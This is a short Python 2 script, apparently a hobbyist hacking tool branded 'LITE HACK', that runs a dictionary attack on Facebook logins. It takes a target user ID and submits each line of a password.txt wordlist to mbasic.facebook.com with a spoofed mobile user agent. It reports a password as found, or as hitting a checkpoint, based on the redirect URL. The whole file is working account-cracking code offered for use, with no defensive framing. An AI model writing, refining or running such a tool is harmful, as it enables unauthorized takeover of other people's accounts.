#!/usr/bin/python
import requests
url ='https://mbasic.facebook.com/login.php'
agent ={'User-agent':'Opera/9.80 (Android; Opera Mini/7.6.40125/191.227; U; id) Presto/2.12.423 Version/12.16'}
print '\033[31mLITE\033[32mHACK'
print
user = raw_input('\033[4;35minput user fb : \033[0m')
x = open('password.txt','r').readlines()
for line in x:
        password = line.strip()
        http = requests.post(url, data={'email':user,'pass':password,'submit':'submit'}, headers=agent)
        if 'checkpoint' in http.url:
                print '\033[33mcekpoint\033[0m',password
                break
        elif 'home.php' in http.url:
                print '\033[32mfound\033[0m',password
                break
